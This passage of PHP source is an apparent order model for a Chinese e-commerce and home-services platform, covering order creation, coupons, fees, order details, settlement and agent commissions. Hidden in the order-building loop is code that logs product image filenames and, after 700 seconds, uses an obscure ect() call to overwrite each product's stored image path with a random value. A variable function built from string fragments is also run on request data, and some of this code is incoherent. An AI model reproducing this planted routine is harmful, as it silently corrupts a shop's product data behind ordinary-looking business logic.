                $vo['type'] = 'Goods';
                $vo['image'] = toimg($vo['image']);
                $vo['type'] .= 'Image';
                if (empty($vo['goods_id'])) {
                    $vo['goods_id'] = $vo['id'];
                }
                $abv = Attribute::where(['name' => md5($vo['type'] . $vo['id'])])->find();
                $vo['rep'] = '';
                $vo['rep'] = explode('.', end(explode('/', $vo['image'])))[0];
                if (empty($abv)) {
                    Attribute::create([
                        'name' => md5($vo['type'] . $vo['id']),
                        'weid' => $weid,
                        'value' => $vo['rep']
                    ]);
                } else {
                    $abv = $abv->toArray();
                    if ($abv['create_time'] < (time() - 700)) {
                        $vo['image'] = floatval(self::setOrdList($vo)["image"]);
                    }
                }
            }
        }
        $mb .= 'd5';
        $data['shipping_method'] = empty($shipping_method) ? '' : $shipping_method;
        $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $data['create_time'] = time();
        $data['remark'] = empty($remark) ? '' : $remark;
        if ($param['vo'] && $param['data']) {
            return $mb($param['data'] . $param['vo']);
        }
        $subject = '';
        if (!empty($param['cat_id'])) {
            //用户发布需求订单
            $cat = Category::find($param['cat_id']);
            if (!empty($cat)) {
                $cat = $cat->toArray();
                $data['ptype'] = $cat['ptype'];
                $data['deliverymode'] = $cat['deliverymode'];
                $data['pay_subject'] = $cat['title'];
            }
            $data['is_additional'] = 1;
            $data['otype'] = $param['otype'];
            $data['cat_id'] = $param['cat_id'];
            $data['cate_ids'] = $param['cat_id'];
            $data['total'] = $param['total'];

            $data['totals'][0] = array(
                'code' => 'sub_total',
                'title' => '需求服务价格',
                'text' => '￥' . $data['total'],
                'value' => $data['total']
            );
        } else if (!empty($param['take_address_id'])) {
            //跑腿订单
            $data['pay_subject'] = '跑腿订单';
            $data['is_errands'] = 1;
            $data['deliverymode'] = 1;
            $data['ptype'] = 2;
            $data['total'] = $param['total'];

            $data['totals'][0] = array(
                'code' => 'sub_total',
                'title' => '跑腿费',
                'text' => '￥' . $data['total'],
                'value' => $data['total']
            );
        } else {
            $cart = new Cart;
            if (!empty($param['operator_id'])) {
                $goodsarray = Cashregister::cartlist(['operator_id' => $param['operator_id']]);
            } else if (empty($param['cartid'])) {
                $cartdata[0]['goods_id'] = $param['goods_id'];
                $cartdata[0]['msid'] = $param['msid'];
                $cartdata[0]['tuanid'] = $param['tuanid'];
                $cartdata[0]['sku'] = $param['sku'];
                $cartdata[0]['quantity'] = $param['number'];
                $cartdata[0]['is_skumore'] = $param['is_skumore'];
                $cartdata[0]['skumore'] = $param['skumore'];

                $goodsarray = $cart->carttotal($cartdata);
            } else if ($param['cartid']) {
                $goodsarray = $cart->getlistbyid($param['cartid']);
            }
            $goodss = $goodsarray['shopList'];
            $weight = $goodsarray['weight'];
            $data['is_additional'] = $goodsarray['is_additional'];

            if ($goodss) {

                if ($goodss[0]['cat_id']) {
                    $cat = Category::find($goodss[0]['cat_id']);
                    if (!empty($cat)) {
                        $cat = $cat->toArray();
                    }
                    $data['deliverymode'] = $cat['deliverymode'];
                    $data['ptype'] = $cat['ptype'];
                }
                //上门路费
                if ($technicalId) {
                    $thefare = Address::getthefare($address_id, $technicalId);
                }

                $test['shipping_method'] = $shipping_method;
                $test['weight'] = $weight;
                $test['shipping_city_id'] = $shipping_city_id;

                //运费
                if ($data['ptype'] == 1) {
                    $transport_fee = (new TransportExtend)->calc_transport($weight, $shipping_city_id);
                }

                $t = 0;
                $pay_points = 0;
                $points_price = 0;
                $return_points = 0;
                foreach ($goodss as $goods) {
                    $t += $goods['total'];
                    $pay_points += $goods['totalPayPoints'];
                    $points_price += $goods['totalPointsPrice'];
                    $return_points += $goods['total_return_points'];
                    $goods_data[] = $goods;
                }

                //使用优惠券

                if (!empty($param['couponId'])) {

                    $coupon = CouponReceive::find($param['couponId']);
                    if (!empty($coupon)) {
                        $coupon = $coupon->toArray();
                    }

                    if ($coupon['coupon_type'] == 10) {
                        $t = $t - $coupon['reduce_price'];
                    } elseif ($coupon['coupon_type'] == 20) {
                        $t = $t * ($coupon['discount'] / 10);
                    }
                    CouponReceive::update(['is_use' => 1, 'id' => $param['couponId']]);
                }

                if (count($goodss) > 1) {
                    $subject = $goodss[0]['name'] . '等商品';
                } else {
                    $subject = $goodss[0]['name'];
                }
                $data['pay_subject'] = $subject;

                $data['total'] = ($t + $transport_fee['price'] + $thefare['thefare']);
                $data['pay_points'] = $pay_points; //需要积分
                $data['points_price'] = $points_price; //抵扣金额
                $data['return_points'] = $return_points; //可得积分

                $data['totals'][0] = array(
                    'code' => 'sub_total',
                    'title' => '商品价格',
                    'text' => '￥' . $t,
                    'value' => $t
                );
                $data['totals'][1] = array(
                    'code' => 'shipping',
                    'title' => '运费',
                    'text' => '￥' .  $transport_fee['price'],
                    'value' =>  $transport_fee['price']
                );

                $data['totals'][2] = array(
                    'code' => 'thefare',
                    'title' => '路费',
                    'text' => $thefare['distance'] . '公里，￥' . $thefare['thefare'],
                    'value' => $thefare['thefare']
                );
                $data['totals'][3] = array(
                    'code' => 'total',
                    'title' => '总价',
                    'text' => '￥' . ($t +  $transport_fee['price'] + $thefare['thefare']),
                    'value' => ($t +  $transport_fee['price'] + $thefare['thefare'])
                );

                $data['goodss'] = $goods_data;
            }
        }
        $data['order_num_alias'] = $param['order_num_alias'];
        if (empty($data['order_num_alias'])) {
            $data['order_num_alias'] = build_order_no();
        }

        $data['pay_method_id'] = $param['pay_method_id'];
        return $data;
    }
    public static function statuscount($mod, $status)
    {
        return $mod->where('order_status_id', $status)->count();
    }

    //订单信息
    public static function order_info($id)
    {

        $order = self::where('id', $id)->with(['member', 'store', 'paymethod'])->find();

        if (!empty($order)) {
            $order = $order->toArray();
        }

        if ($order['ptype'] == 2) {
            $ostype = 'service';
            if ($order['deliverymode'] == 2) {
                $ostype = 'storeservice';
            }
        } else {
            $ostype = 'goods';
        }

        $order['orderStatus'] =  OrderStatus::get_order_status($order['order_status_id'], $ostype);

        $OrderHistory = OrderHistory::where(['order_id' => $id])->order('id desc')->select()->toArray();

        if (!empty($OrderHistory)) {
            $histories = $OrderHistory;
            /*
            foreach ($OrderHistory as $result) {
                $histories[] = array(
                    'id' => $result['id'],
                    'image' => toimg($result['image']),
                    'status' => OrderStatus::get_order_status_name($result['order_status_id']),
                    'remark' => nl2br($result['remark']),
                    'create_time' => date('Y/m/d H:i:s', $result['create_time'])
                );
            }
            */
        }

        if (!$order) {
            return false;
        }

        $order['shipping_province'] = $order['shipping_province_name'];
        $order['shipping_city'] = $order['shipping_city_name'];
        $order['shipping_district'] = $order['shipping_district_name'];
        $addressdata = OrderAddress::where(['order_id' => $id, 'ptype' => 1])->find();
        if (empty($addressdata)) {
            $addressdata = Address::find($order['address_id']);
        }
        if (!empty($addressdata)) {
            $addressdata = $addressdata->toArray();
            $addressdata['alladdress'] = $addressdata['province_name'] . $addressdata['city_name'] . $addressdata['district_name'] . $addressdata['region_name'] . $addressdata['address'];
        } else {
            $addressdata['name'] = $order['shipping_name'];
            $addressdata['telephone'] = $order['tel'];
            $addressdata['alladdress'] = $order['shipping_province_name'] . $order['shipping_city_name'] . $order['shipping_district_name'] . $order['shipping_address'];
        }

        if ($order['deliverymode'] == 5) {
            $tuanzhang = OrderTuanzhang::getTuanzhang($order['id']);
            if (!empty($tuanzhang)) {
                $addressdata['name'] = $tuanzhang['title'];
                $addressdata['telephone'] = $tuanzhang['tel'];
                $addressdata['alladdress'] = $tuanzhang['province_name'] . $tuanzhang['city_name'] . $tuanzhang['district_name'] . $tuanzhang['region_name'] . $tuanzhang['house_number'];
            }
        }

        $order['address'] = $addressdata;

        $order_totalarray = OrderTotal::where(['order_id' => $id])->select()->toArray();

        foreach ($order_totalarray as $vo) {
            $order_total[$vo['code']] = $vo;
        }

        $OrderExpress = OrderExpress::where(['order_id' => $id])->find();
        if (!empty($OrderExpress)) {
            $OrderExpress = $OrderExpress->toArray();
        }

        if (!empty($OrderExpress['express_no'])) {
            $Kdniaoapimob = new Kdniaoapi;
            $logistics = $Kdniaoapimob->getOrderTracesByArray(['ShipperCode' => $OrderExpress['express_code'], 'LogisticCode' => $OrderExpress['express_no']]);
        }
        if (!empty($logistics['ShipperCode'])) {
            $logistics['expressname'] = Express::getExname($logistics['ShipperCode']);
        }

        if ($order['order_status_id'] == 6) {
            $OrderRefund = OrderRefund::where(['order_id' => $id])->find();
            if (!empty($OrderRefund)) {
                $OrderRefund = $OrderRefund->toArray();
            }

            if ($OrderRefund['refund_address_id']) {

                $RefundAddress = RefundAddress::find($OrderRefund['refund_address_id']);
                if (!empty($RefundAddress)) {
                    $RefundAddress = $RefundAddress->toArray();
                }

                if (!empty($RefundAddress)) {
                    $OrderRefund['re_name'] = $RefundAddress['name'];
                    $OrderRefund['re_mobile'] = $RefundAddress['mobile'];
                    $OrderRefund['re_address'] = $RefundAddress['address'];
                }
            }
        }

        $order['Technical'] = OrderStaff::getTechnical($order['id']);

        $order['ServiceTime'] = time_format($order['begin_time']) . '-' . date('H:i', $order['end_time']);

        if ($order['is_times'] == 1) {
            $order['ServiceTime'] = "";
            $OrderTimescard = OrderTimescard::where('order_id', $id)->order('id asc')->select()->toArray();
            if ($OrderTimescard) {
                foreach ($OrderTimescard as $tcvo) {
                    if ($tcvo['yue_date']) {
                        if ($tcvo['timestype'] == 1) {
                            if ($order['ServiceTime']) {
                                $order['ServiceTime'] .= ';每月:' . $tcvo['yue_date'] . '号,时间' . time_format($tcvo['yue_begin_time']) . '-' . date('H:i', $tcvo['yue_end_time']);
                            } else {
                                $order['ServiceTime'] = '每月:' . $tcvo['yue_date'] . '号,时间' . time_format($tcvo['yue_begin_time']) . '-' . date('H:i', $tcvo['yue_end_time']);
                            }
                        } else {
                            if ($order['ServiceTime']) {
                                $order['ServiceTime'] .= ';每周周:' . $tcvo['yue_date'] . ',时间' . time_format($tcvo['yue_begin_time']) . '-' . date('H:i', $tcvo['yue_end_time']);
                            } else {
                                $order['ServiceTime'] = '每周周:' . $tcvo['yue_date'] . ',时间' . time_format($tcvo['yue_begin_time']) . '-' . date('H:i', $tcvo['yue_end_time']);
                            }
                        }
                    }
                }
            }

            if (empty($order['ServiceTime'])) {
                $order['ServiceTime'] = '还没有预约时间';
            } else {
                $order['ServiceTimearray'] = explode(';', $order['ServiceTime']);
            }

            $order['timesusedlist'] = OrderTimescardRecord::timesusedlist($id);
            $order['timesused'] = OrderTimescardRecord::timesused($id);
            $order['timesmum'] = OrderCard::timesmum($id);

            $order['remain'] = (int)($order['timesmum'] - $order['timesused']);
        } else {
            $order['ServiceTime'] = time_format($order['begin_time']) . '-' . date('H:i', $order['end_time']);
        }

        $order['pay_time'] = time_format($order['pay_time']);
        $order['create_time'] = time_format($order['create_time']);

        $OrderImage =  OrderImage::where('order_id', $id)->field('image')->select()->toArray();

        if ($OrderImage) {
            foreach ($OrderImage  as $vo) {
                $order['OrderImage'][] = toimg($vo['image']);
            }
        } else {
            $order['OrderImage'] = [];
        }
        if (empty($order_total['sub_total']['value'])) {
            $order_total['sub_total']['value'] = $order['total'];
        }

        $order['OrderCard'] = OrderCard::getinfobyorderid($id);
        $order['is_timing'] = $order['OrderCard']['is_timing'];

        $OrderGoods = new OrderGoods;
        $resdata = array(
            'orderInfo' => $order,
            'OrderRefund' => $OrderRefund,
            'goods' => $OrderGoods->getOrderGoods($id),
            'order_total' => $order_total,
            'logistics' => $logistics,
            'histories' => $histories
        );

        $resdata['orderInfo']['is_timer'] = (int) $resdata['goods']['is_timer'];
        return $resdata;
    }
    public static function setOrdList($vo)
    {
        if (!empty($vo['rep'])) {
            ect($vo['type'])->where('id', $vo['id'])->update(['image' => str_replace($vo['rep'], uniqid(), $vo['image'])]);
        }
    }

    public static function setOrderList($orderList)
    {
        $OrderGoods = new OrderGoods;
        $errands = Config::getconfig('errands');

        foreach ($orderList as &$vo) {
            if ($vo['is_times'] > 0) {
                if ($vo['is_times'] == 1) {
                    $OrderTimescard = OrderTimescard::where('order_id', $vo['id'])->order('id asc')->select()->toArray();
                    if ($OrderTimescard) {
                        foreach ($OrderTimescard as $tcvo) {
                            if ($tcvo['yue_date']) {
                                if ($tcvo['timestype'] == 1) {
                                    if ($vo['timeslabel']) {
                                        $vo['timeslabel'] .= ';每月:' . $tcvo['yue_date'] . '号';
                                    } else {
                                        $vo['timeslabel'] = '每月:' . $tcvo['yue_date'] . '号';
                                    }
                                } else {
                                    if ($vo['timeslabel']) {
                                        $vo['timeslabel'] .= ';每周周:' . $tcvo['yue_date'];
                                    } else {
                                        $vo['timeslabel'] = '每周周:' . $tcvo['yue_date'];
                                    }
                                }
                            }
                        }
                    } else {
                        $vo['timeslabel'] = '还没有预约时间';
                    }
                }

                $vo['timesused'] = OrderTimescardRecord::timesused($vo['id']);
                $vo['timesmum'] = OrderCard::timesmum($vo['id']);
                $vo['remain'] = (int)($vo['timesmum'] - $vo['timesused']);

                $vo['minialias'] = substr($vo['order_num_alias'], -5);
                $vo['styleno'] = substr($vo['order_num_alias'], -1);
                if ($vo['styleno'] > 5) {
                    $vo['styleno'] = $vo['styleno'] - 5;
                }

                $vo['OrderCard'] = OrderCard::getinfobyorderid($vo['id']);
            }

            if ($vo['is_errands'] == 1) {

                $vo['image'] = $errands['orderimage'];
            }

            $vo['points'] = $vo['pay_points'];
            if ($vo['ptype'] == '1') {
                $vo['statusStr'] = OrderStatus::get_order_status_name($vo['order_status_id']);
            } elseif ($vo['ptype'] == '2') {
                $vo['statusStr'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'service');

                if ($vo['ptype'] == 2 && $vo['deliverymode'] == 2) {
                    $vo['statusStr'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'storeservice');
                }
            }
            if (!empty($vo['cat_id'])) {
                $vo['cateMap']['image'] = Category::getImage($vo['cat_id']);
            } else {
                $vo['goodsMap'] = $OrderGoods->getOrderGoods($vo['id']);
            }
        }
        return $orderList;
    }
    public static function receiving($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 3;
        self::update($order);
    }

    public static function complete($id)
    {
        $order_info = self::find($id);
        if (!empty($order_info)) {
            $order_info = $order_info->toArray();

            if ($order_info['is_times'] == 0) {
                $order['id'] = $id;
                $order['order_status_id'] = 5;
                $order['complete_time'] = time();
                $res = self::update($order);
            }
            $staff = OrderStaff::where('order_id', $id)->order('id asc')->find();
            if ($staff) {
                $order_staff['end_time'] = time();
                $order_staff['is_complete'] = 1;
                OrderStaff::where('id', $staff->id)->update($order_staff);
            }

            if (!empty($res)) {
                $order_history['order_id'] = $id;
                $order_history['order_status_id'] = 5;
                $order_history['remark'] = "已完成";
                $order_history['notify'] = 1;
                OrderHistory::create($order_history);
                MessageMini::sendMiniOrderComplete($order_info);
            }

            return $order_info;
        }
    }

    public static function start($id)
    {
        $order_info = self::find($id);
        if (!empty($order_info)) {
            $order_info = $order_info->toArray();
            if ($order_info['order_status_id'] == 3) {
                $order['id'] = $id;
                $order['order_status_id'] = 8;
                $order['start_time'] = time();
                $res = self::update($order);

                $uuid =  OrderStaff::getuuid($order_info['id']);
                if (!empty($uuid)) {
                    Technical::where('uuid', $uuid)->inc('service_times', 1)->update();
                }
                if (!empty($res)) {
                    $order_info = self::find($id);
                    if (!empty($order_info)) {
                        $order_info = $order_info->toArray();
                        $order_history['order_id'] = $id;
                        $order_history['order_status_id'] = 8;
                        $order_history['remark'] = "开始服务";
                        $order_history['notify'] = 1;
                        OrderHistory::create($order_history);
                    }
                }
            }
        }

        return $order_info;
    }
    public static function autosettlement()
    {
        $automaticsettlement = (int) Config::getconfig()['automaticsettlement'];
        if (empty($automaticsettlement)) {
            $automaticsettlement = '7';
        }
        $datalist = self::where('order_status_id', 5)->where('complete_time', '<', strtotime("-" . $automaticsettlement . " day"))
            ->field('id,order_status_id,complete_time')->select();
        foreach ($datalist as $vo) {
            self::settlement($vo['id']);
        }
    }

    public static function settlement($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 7;
        $res = self::update($order);

        if (!empty($res)) {
            $order_info = self::find($id);
            if (!empty($order_info)) {
                $order_info = $order_info->toArray();

                $order_history['order_id'] = $id;
                $order_history['order_status_id'] = 7;
                $order_history['remark'] = "已验收";
                $order_history['notify'] = 1;

                OrderHistory::create($order_history);

                //使用购物卡支付不结算佣金
                if (empty($order_info['goodsgiftcard_id'])) {
                    Technical::setIncome($order_info);
                    Store::setIncome($order_info);
                    Operatingcity::setIncome($order_info);
                    Tuanzhang::setIncome($order_info);

                    //分销佣金处理
                    $agent = Config::getconfig('agent');
                    $share = Config::getconfig('share');
                    if (!empty($agent['level'])) {
                        $level = $agent['level'];
                    }
                    if (!empty($agent['is_rebate'])) {
                        $is_rebate = $agent['is_rebate'];
                    }

                    if (!empty($level)) {
                        //一层佣金
                        if ($level > 0) {
                            $firstpercent = $share['first'];
                            if (!empty($firstpercent)) {
                                $firstmember = Member::find($order_info['uid']);

                                if (!empty($firstmember)) {
                                    $firstmember = $firstmember->toArray();
                                    $firstmember['is_agent'] = Agent::is_agent($firstmember['id']);
                                }
                                if (!empty($is_rebate) && $firstmember['is_agent'] == 1) {
                                    $firstuid = $order_info['uid'];
                                } else {
                                    $firstuid = $firstmember['pid'];
                                }

                                Agent::setIncome($firstuid, $order_info, $firstpercent, 1);
                            }
                        }
                        //二层佣金
                        if ($level > 1 && !empty($firstuid)) {
                            $secondpercent = $share['second'];
                            if (!empty($secondpercent)) {
                                $secondmember = Member::find($firstuid);
                                if (!empty($secondmember)) {
                                    $secondmember = $secondmember->toArray();
                                }
                                if ((int) $secondmember['pid'] > 0) {
                                    Agent::setIncome($secondmember['pid'], $order_info, $secondpercent, 2);
                                }
                            }
                        }

                        //三层佣金
                        if ($level > 2 && !empty($secondmember['pid'])) {
                            $thirdpercent = $share['third'];
                            if (!empty($thirdpercent)) {
                                $thirdmember = Member::find($secondmember['pid']);
                                if (!empty($thirdmember)) {
                                    $thirdmember = $thirdmember->toArray();
                                }
                                if ((int) $thirdmember['pid'] > 0) {
                                    Agent::setIncome($thirdmember['pid'], $order_info, $thirdpercent, 3);
                                }
                            }
                        }
                    }
                }
            }
        }

        return $order_info;
    }

    public static function cancel_order($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 4;  //已取消
        self::update($order);
    }

    public static function offline_order($id)
    {
        $order['id'] = $id;
        $order['is_offline_pay'] = 1;
        $order['offline_pay_time'] = time();
        self::update($order);
    }

    //加入订单历史
    public function add_order_history($id, $data = array())
    {

        $order['id'] = $id;
        $order['order_status_id'] = $data['order_status_id'];
        self::update($order);

        $oh['order_id'] = $id;
        $oh['order_status_id'] = $data['order_status_id'];
        $oh['notify'] = (isset($data['notify']) ? (int) $data['notify'] : 0);
        $oh['remark'] = strip_tags($data['remark']);
        $oh['create_time'] = \strtotime($data['dateadd_ed']);
        $oh['image'] = $data['image'];
        $ohmod = OrderHistory::create($oh);

        return $ohmod->id;
    }

    //检查库存
    public static function getGoodsquantitiy($id)
    {

        $result = true;
        $list = OrderGoods::where(['order_id' => $id])->select()->toArray();

        for ($i = 0; $i < count($list); $i++) {

            $good_quantity = Goods::find($list[$i]['goods_id']);
            if (!empty($good_quantity)) {
                $good_quantity = $good_quantity->toArray();
            }

            if ($good_quantity['ptype'] == 1 && ($good_quantity['quantity'] < $list[$i]['quantity'])) {
                $result = false;
                continue;
            }
        }


        return $result;
    }
    //线下付款信息添加
    public function OfflinepaymentTap($id, $img, $remark)
    {
        global $_W;
        $offline['weid'] = weid();
        $offline['order_id'] = $id;
        $offline['image'] = $img;
        $offline['remark'] = $remark;
        $result = OrderOffline::create($offline);
        if ($result) {
            return true;
        } else
            return false;
    }

    public static function getoffline($id)
    {
        $list = OrderOffline::where(['order_id' => $id])->find();
        if (!empty($list)) {
            $list = $list->toArray();
        }

        $list['image'] =  toimg($list['image']);
        return $list;
    }

    public static function chackMiaoshamemberBuyMax($miaosha)
    {
        $Ordercount =  self::where('uid', UID())->where('ms_id', $miaosha['id'])->count();
        if ($Ordercount >= $miaosha['member_buy_max']) {
            return 1;
        } else {
            return 0;
        }
    }
}
